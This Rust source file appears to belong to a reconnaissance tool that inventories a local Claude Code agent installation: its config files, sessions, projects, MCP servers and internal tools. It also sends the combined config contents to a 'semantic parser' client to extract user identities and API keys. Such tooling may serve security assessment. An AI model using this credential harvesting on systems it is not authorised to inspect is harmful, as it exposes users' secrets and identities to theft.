use super::ClaudeCodeAgent;
use crate::agent_connectors::traits::{Agent, AgentRecon};
use crate::utils::semantic_parser::{
    self, build_metadata_extraction_prompt, parse_metadata_from_json,
    METADATA_EXTRACTION_SCHEMA,
};
use async_trait::async_trait;
use common::{
    AgentTool, ReconConfig, ReconMetadata, ReconResult, ReconTools, SessionContext,
};

#[async_trait]
impl AgentRecon for ClaudeCodeAgent {
    async fn perform_recon(&self, is_semantic: bool) -> Option<ReconResult> {
        common::log_info!(
            "Performing recon (is_semantic={})",
            is_semantic
        );

        //
        // Get enumeration data (configs, sessions, project_paths) first.
        // We need config_items to parse MCP servers from them.
        //
        let (config, sessions, project_paths) = match super::enumeration::enumerate() {
            Ok(data) => {
                let config = ReconConfig {
                    items: data.config_items,
                };
                (config, data.sessions, data.project_paths)
            }
            Err(e) => {
                common::log_warn!("Enumeration failed: {}", e);
                (ReconConfig::default(), Vec::new(), Vec::new())
            }
        };

        let mut tools = ReconTools::default();

        //
        // MCP servers - parse from config files with context paths.
        //
        tools.mcp_servers = super::mcp::discover_mcp_servers_from_configs(&config.items).await;

        //
        // Skills - static discovery (currently returns empty for Claude Code).
        //
        tools.skills = self.discover_skills();

        //
        // Internal tools - only with semantic recon.
        //
        if is_semantic {
            common::log_info!("Including internal tools in semantic recon");
            tools.internal_tools = self.discover_internal_tools_semantically().await;
        }

        //
        // Extract metadata from config files using semantic parser (always, not
        // just semantic recon).
        //
        let metadata = if !config.items.is_empty() {
            self.extract_metadata_from_configs(&config).await
        } else {
            None
        };

        common::log_info!(
            "Recon complete - {} MCP servers, {} skills, {} internal tools, {} config items, {} sessions, {} projects, metadata={}",
            tools.mcp_servers.len(),
            tools.skills.len(),
            tools.internal_tools.len(),
            config.items.len(),
            sessions.len(),
            project_paths.len(),
            metadata.is_some()
        );

        Some(ReconResult {
            tools,
            config,
            sessions,
            project_paths,
            metadata,
        })
    }
}

impl ClaudeCodeAgent {
    //
    // Discover internal tools by querying the agent via a temporary session.
    //
    async fn discover_internal_tools_semantically(&self) -> Vec<AgentTool> {
        //
        // Close any existing session.
        //
        {
            let mut guard = self.session.write().unwrap();
            if let Some(session) = guard.as_ref() {
                common::log_info!("Closing existing session for internal tools discovery");
                session.close();
            }
            *guard = None;
        }

        //
        // Use shared recon function to discover internal tools.
        //
        let result = crate::agent_connectors::utils::discover_internal_tools_semantically(
            "ClaudeCodeAgent",
            || {
                let temp_context = SessionContext::default();
                self.create_session(&temp_context)
                    .ok_or_else(|| anyhow::anyhow!("Failed to create session"))
            }
        )
        .await;

        //
        // Clear the temporary session created during discovery. The utility
        // function calls close() on the session, but self.session still holds
        // a reference from create_session().
        //

        {
            let mut guard = self.session.write().unwrap();
            *guard = None;
        }

        result
    }

    //
    // Get skills (slash commands) - returns empty for now, could be enhanced to
    // detect from config.
    //
    fn discover_skills(&self) -> Vec<AgentTool> {
        //
        // TODO: Could parse ~/.claude/settings.json or similar for custom
        // skills.
        // For now return empty - Claude Code doesn't expose skills in a
        // discoverable way.
        //
        Vec::new()
    }

    //
    // Extract metadata (user identities, API keys) from config files using the
    // semantic parser.
    //
    async fn extract_metadata_from_configs(&self, config: &ReconConfig) -> Option<ReconMetadata> {
        if config.items.is_empty() {
            return None;
        }

        common::log_info!(
            "Extracting metadata from {} config files",
            config.items.len()
        );

        //
        // Combine all config contents into a single string for parsing.
        //
        let combined_configs: String = config
            .items
            .iter()
            .map(|item| format!("=== {} ({}) ===\n{}\n", item.path, item.config_type, item.contents))
            .collect::<Vec<_>>()
            .join("\n");

        //
        // Get the semantic parser client.
        //
        let semantic_client = match semantic_parser::get_client() {
            Some(client) => client,
            None => {
                common::log_warn!("Semantic parser client not available for metadata extraction");
                return None;
            }
        };

        //
        // Send to semantic parser for metadata extraction.
        //
        let extraction_prompt = build_metadata_extraction_prompt(&combined_configs);
        match semantic_client
            .parse(extraction_prompt, METADATA_EXTRACTION_SCHEMA.to_string())
            .await
        {
            Ok(parser_response) => {
                if parser_response.success {
                    if let Some(json) = parser_response.json {
                        if let Some(extracted) = parse_metadata_from_json(&json) {
                            let has_identities = !extracted.user_identities.is_empty();
                            let has_keys = !extracted.api_keys.is_empty();

                            if has_identities || has_keys {
                                common::log_info!(
                                    "Extracted {} user identities, {} API keys",
                                    extracted.user_identities.len(),
                                    extracted.api_keys.len()
                                );

                                return Some(ReconMetadata {
                                    user_identities: if has_identities {
                                        Some(extracted.user_identities)
                                    } else {
                                        None
                                    },
                                    api_keys: if has_keys {
                                        Some(extracted.api_keys)
                                    } else {
                                        None
                                    },
                                });
                            }
                        }
                    }
                }
                common::log_warn!(
                    "Semantic parser failed for metadata extraction: {:?}",
                    parser_response.error
                );
            }
            Err(e) => {
                common::log_warn!(
                    "Semantic parser request failed for metadata extraction: {}",
                    e
                );
            }
        }

        None
    }
}
